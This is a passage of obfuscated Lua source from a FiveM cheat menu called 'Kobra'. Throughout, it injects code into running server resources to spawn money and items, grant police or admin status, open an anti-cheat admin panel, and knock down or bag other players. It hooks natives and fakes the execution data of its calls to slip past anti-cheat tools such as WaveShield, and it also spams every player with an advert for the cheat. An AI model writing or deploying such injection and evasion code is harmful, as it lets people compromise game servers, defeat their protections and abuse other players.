                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);break;end end end});end if (GetResourceState("mc9-mainmenu")=="started") then v84({type="button",label="MC9 Item Spawner",onSelect=function() v0:Notify("success","Kobra","Spawning Items",3000);MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);end});end if (GetResourceState("vMenu")=="started") then v84({type="button",label="Message Server",onSelect=function() local v591=0 + 0 ;while true do if (v591==0) then v0:Notify("success","Kobra","Message Sent",3000);MachoInjectResource2(1 + 0 ,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is repercing with Kobra Bypass, the leading cheat in the market. Join our discord at https://discord.gg/6zXK6wNu')
                ]]);break;end end end});end if (GetResourceState("amigo")=="started") then v84({type="button",label="Give Item #1",onSelect=function() local v592=0 + 0 ;local v593;local v594;local v595;local v596;local v597;local v598;while true do if (v592==(1 + 0)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v594=v593("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v594));v592=2;end if (v592==(1 + 2)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v595));v596=tonumber(v595);if ( not v596 or (v596<1)) then local v967=0 -0 ;while true do if (v967==0) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v596=1 + 0 ;break;end end end v592=4;end if (v592==6) then if  not v597 then local v968=96 -(23 + 73) ;while true do if (v968==1) then v0:Notify("error","Kobra","String format failed — check console",4285 -(26 + 259) );break;end if (v968==0) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v598);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v594),"itemCount =",tostring(v596));v968=1 + 0 ;end end else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v0:ShowUI();break;end if (4==v592) then if (v596>100000) then local v969=0;while true do if (v969==0) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v596=156117 -56117 ;break;end end end v594=tostring(v594 or "" );v596=tonumber(v596 or 1 );v592=17 -12 ;end if (v592==2) then if ( not v594 or (v594=="")) then local v970=1629 -(1094 + 535) ;while true do if (v970==0) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v0:Notify("error","Kobra","No item name entered",341 + 2659 );v970=1877 -(1554 + 322) ;end if (v970==(1426 -(989 + 436))) then v0:ShowUI();return;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v595=v593("Item Count","1");v592=1181 -(816 + 362) ;end if (v592==(0 -0)) then v0:HideUI();v593=nil;function v593(v857,v858) local v859=nil;local v860=false;v47(v857,v858 or "" ,function(v971) local v972=0 -0 ;while true do if (v972==(0 -0)) then v859=v971;v860=true;break;end end end,"typeable");while  not v860 do Wait(0 -0 );end return v859;end v592=2 -1 ;end if (v592==(21 -16)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v594);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v596);v597,v598=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v594,v596,v594,v596));end);v592=1 + 5 ;end end end});end local v266=GetResourceState("scripts")=="started" ;local v267=GetResourceState("framework")=="started" ;if (v266 or v267) then local v527=763 -(86 + 677) ;local v528;while true do if ((0 + 0)==v527) then v528=(v266 and "scripts") or "framework" ;v84({type="button",label="End Comserv",onSelect=function() v0:Notify("Comserv","Kobra","Action Removed you might have to spam this",67 + 2933 );MachoInjectResourceRaw(v528,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]]);end});break;end end end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v84({type="button",label="Setjob Police #1 (New)",onSelect=function() if (GetResourceState("es_extended")=="started") then v0:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);elseif (GetResourceState("core")=="started") then local v861=1026 -(263 + 763) ;while true do if (v861==(0 + 0)) then v0:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v84({type="button",label="Set Job #2(Police)",onSelect=function() local v599=858 -(649 + 209) ;while true do if (v599==(0 -0)) then v0:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);break;end end end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v84({type="button",label="Give Shoes Reward",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 1000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v84({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v600) if v600 then local v770=731 -(643 + 88) ;while true do if (v770==0) then v0:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",5769 -(54 + 1715) );v36("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);break;end end else v0:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",15672 -11672 );v36("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);end end});end if (GetResourceState("rzrp-base")=="started") then v84({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v601) if v601 then local v771=0;while true do if (v771==(0 -0)) then print("Bag Closest Players Started...");v36("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);break;end end else print("Bag Closest Players Stopped...");v36("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v84({type="button",label="Set Gang",onSelect=function() local v602=0 -0 ;local v603;local v604;local v605;local v606;while true do if (2==v602) then Wait(804 + 196 );v605=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;v606=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v603,v604);v602=1 + 2 ;end if (v602==(11 -8)) then v36(v605,v606);v0:ShowUI();v0:Notify("success","Kobra","Gang Set",5383 -(132 + 1251) );break;end if (v602==(0 + 0)) then v603="";v604=2 -1 ;v0:HideUI();v602=1 + 0 ;end if (v602==1) then v47("Gang Name","",function(v862) if (v862 and (v862~="")) then v603=v862;end end,"typeable");Wait(2758 -(185 + 273) );v47("Gang Rank","",function(v863) if (v863 and (v863~="")) then v604=tonumber(v863) or 1 ;end end,"typeable");v602=1 + 1 ;end end end});end if (GetResourceState("framework")=="started") then v84({type="button",label="Give Item #2",onSelect=function() local v607=0 -0 ;local v608;local v609;local v610;local v611;local v612;local v613;while true do if (v607==4) then if (v611>(37546 + 62454)) then local v973=0;while true do if (v973==(1224 -(361 + 863))) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v611=272726 -172726 ;break;end end end v609=tostring(v609 or "" );v611=tonumber(v611 or 1 );v607=5;end if (v607==(1328 -(443 + 884))) then print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v609=v608("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v609));v607=4 -2 ;end if (v607==(1 + 2)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v610));v611=tonumber(v610);if ( not v611 or (v611<1)) then local v974=0 -0 ;while true do if (v974==(0 + 0)) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v611=1 + 0 ;break;end end end v607=4;end if (v607==(4 -2)) then if ( not v609 or (v609=="")) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v0:Notify("error","Kobra","No item name entered",3000);v0:ShowUI();return;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v610=v608("Item Count","1");v607=750 -(16 + 731) ;end if ((0 + 0)==v607) then v0:HideUI();v608=nil;function v608(v864,v865) local v866=0 + 0 ;local v867;local v868;while true do if ((0 + 0)==v866) then v867=nil;v868=false;v866=1;end if (v866==(761 -(527 + 233))) then v47(v864,v865 or "" ,function(v1091) local v1092=0 + 0 ;while true do if (v1092==(0 -0)) then v867=v1091;v868=true;break;end end end,"typeable");while  not v868 do Wait(0 + 0 );end v866=1787 -(1107 + 678) ;end if (v866==(2 + 0)) then return v867;end end end v607=1;end if (v607==(6 + 0)) then if  not v612 then local v975=50 -(4 + 46) ;while true do if (0==v975) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v613);v0:Notify("error","Kobra","String format failed — check console",15082 -11082 );break;end end else local v976=0;while true do if (v976==0) then print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v0:Notify("success","Kobra","Item Sent",7355 -3355 );break;end end end v0:ShowUI();break;end if (v607==5) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v609);print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v611);v612,v613=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v609,v611));end);v607=4 + 2 ;end end end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v84({type="button",label="Give Item #3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v84({type="button",label="Set Chat Tag",onSelect=function() local v614=0;local v615;local v616;local v617;local v618;while true do if (3==v614) then v618=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v618,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v616,v617));v0:ShowUI();break;end if (v614==0) then v0:HideUI();v615=nil;function v615(v869,v870) local v871=0 -0 ;local v872;local v873;while true do if (v871==(1 -0)) then v47(v869,v870 or "" ,function(v1093) v872=v1093;v873=true;end,"typeable");while  not v873 do Wait(0);end v871=2;end if ((1398 -(1262 + 134))==v871) then return v872;end if (v871==(0 -0)) then v872=nil;v873=false;v871=1 + 0 ;end end end v614=1;end if ((2 + 0)==v614) then v617=v615("Tag Color (R, G, B)","0, 255, 0");if ( not v617 or (v617=="")) then v617="255, 255, 255";end Wait(1295 -(383 + 412) );v614=3;end if (v614==1) then v616=v615("Chat Tag Name","");if ( not v616 or (v616=="")) then local v977=0;while true do if (v977==(0 + 0)) then v0:ShowUI();return;end end end Wait(500);v614=2;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v84({type="button",label="Set Job #3 (Police)",onSelect=function() local v619=0;while true do if (v619==(0 + 0)) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v84({type="button",label="Set Job #2 (EMS)",onSelect=function() MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);end});end if (GetResourceState("ElectronAC")=="started") then v84({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v84({type="button",label="Give Money #1",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v47("Choose Menu Key","",function(v462) for v529,v530 in pairs(v32) do if (v530:lower()==v462:lower()) then local v684=0 + 0 ;while true do if (v684==(1 + 0)) then v0:ShowUI();return;end if (v684==(0 + 0)) then v11=v530;Wait(250);v684=1;end end end end end,"keybind");local v268=0 -0 ;local v269=120;while true do Wait(0 + 0 );if v20 then local v620=v26[v27];if IsControlJustReleased(0 -0 ,14) then v27=(v27% #v26) + (1 -0) ;MachoSendDuiMessage(v2,json.encode({action="scroll",direction="down"}));end if IsControlJustReleased(0,15) then local v772=0 -0 ;while true do if ((0 + 0)==v772) then v27=((v27-(709 -(667 + 40)))% #v26) + (1311 -(436 + 874)) ;MachoSendDuiMessage(v2,json.encode({action="scroll",direction="up"}));break;end end end if (v620=="Shoot Weapon") then local v773=1606 -(762 + 844) ;while true do if (v773==(0 -0)) then if IsDisabledControlJustPressed(0 -0 ,1 + 43 ) then local v1069=0;while true do if (v1069==0) then v22=((v22-(1 + 1))% #v24) + (477 -(209 + 267)) ;MachoSendDuiMessage(v2,json.encode({action="updateWeapon",index=v22}));break;end end end if IsDisabledControlJustPressed(0,69 -31 ) then v22=(v22% #v24) + 1 ;MachoSendDuiMessage(v2,json.encode({action="updateWeapon",index=v22}));end break;end end elseif (v620=="Spawn Car") then local v874=0;while true do if (v874==(0 -0)) then if IsDisabledControlJustPressed(0,1755 -(1611 + 100) ) then local v1178=0 + 0 ;while true do if (0==v1178) then v23=((v23-(786 -(14 + 770)))% #v25) + (1785 -(1165 + 619)) ;MachoSendDuiMessage(v2,json.encode({action="updateVehicle",index=v23}));break;end end end if IsDisabledControlJustPressed(0,59 -21 ) then local v1179=381 -(229 + 152) ;while true do if ((194 -(107 + 87))==v1179) then v23=(v23% #v25) + (1 -0) ;MachoSendDuiMessage(v2,json.encode({action="updateVehicle",index=v23}));break;end end end break;end end end if IsDisabledControlPressed(0 + 0 ,19 + 5 ) then local v774=v620;if (v774=="Shoot Weapon") then local v875=v24[v22];if (v875=="WEAPON_PERMKILL") then v875="WEAPON_TRANQUILIZER";elseif (v875=="WEAPON_RPG_2") then v875="WEAPON_AIRSTRIKE_ROCKET";end if (v875~=v21) then local v1004=0 -0 ;while true do if (v1004==1) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1511=0 -0 ;local v1512;local v1513;local v1514;local v1515;local v1516;local v1517;local v1518;local v1519;local v1520;local v1521;while true do if (v1511==(2 + 0)) then hNative("GetHashKey",function(v1667,...) return v1667(...);end);hNative("GiveWeaponToPed",function(v1668,...) return v1668(...);end);hNative("SetCurrentPedWeapon",function(v1669,...) return v1669(...);end);v1511=17 -(13 + 1) ;end if (v1511==4) then v1513=GetCamCoord(_G.KobraFreecamObject);v1514=GetCamRot(_G.KobraFreecamObject,2 + 0 );v1515=v1512(v1514);v1511=4 + 1 ;end if (v1511==(1066 -(987 + 71))) then ShootSingleBulletBetweenCoords(v1513.x,v1513.y,v1513.z,v1517.x,v1517.y,v1517.z,284 -184 ,true,v1519,PlayerPedId(),true,false,128715 -28715 );break;end if (v1511==(700 -(514 + 185))) then hNative("CreateThread",function(v1670,...) return v1670(...);end);hNative("Wait",function(v1671,...) return v1671(...);end);hNative("PlayerPedId",function(v1672,...) return v1672(...);end);v1511=1 + 1 ;end if (v1511==(5 -2)) then hNative("GetCurrentPedWeapon",function(v1673,...) return v1673(...);end);hNative("RemoveWeaponFromPed",function(v1674,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1675,...) return v1675(...);end);v1511=15 -11 ;end if (v1511==5) then v1516=1000;v1517=v1513 + (v1515 * v1516) ;v1518=PlayerPedId();v1511=1510 -(771 + 733) ;end if (v1511==(14 -7)) then v1521=v1520(v875);v36(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1518,v1521));Wait(756 -406 );v1511=1175 -(407 + 760) ;end if (v1511==(0 + 0)) then v1512=nil;function v1512(v1676) local v1677=0;local v1678;local v1679;local v1680;while true do if (v1677==1) then v1680=math.abs(math.cos(v1679));return vector3( -math.sin(v1678) * v1680 ,math.cos(v1678) * v1680 ,math.sin(v1679));end if (v1677==(0 + 0)) then v1678=math.rad(v1676.z);v1679=math.rad(v1676.x);v1677=1 + 0 ;end end end function hNative(v1681,v1682) local v1683=1854 -(169 + 1685) ;local v1684;while true do if (v1683==(0 + 0)) then v1684=_G[v1681];if ( not v1684 or (type(v1684)~="function")) then return;end v1683=392 -(41 + 350) ;end if (v1683==1) then _G[v1681]=function(...) return v1682(v1684,...);end;break;end end end v1511=1;end if (v1511==(16 -10)) then v1519=GetHashKey(v875);v1520=nil;function v1520(v1685) local v1686={};for v1691=2 -1 , #v1685 do v1686[v1691]=string.byte(v1685,v1691);end return table.concat(v1686,",");end v1511=7;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
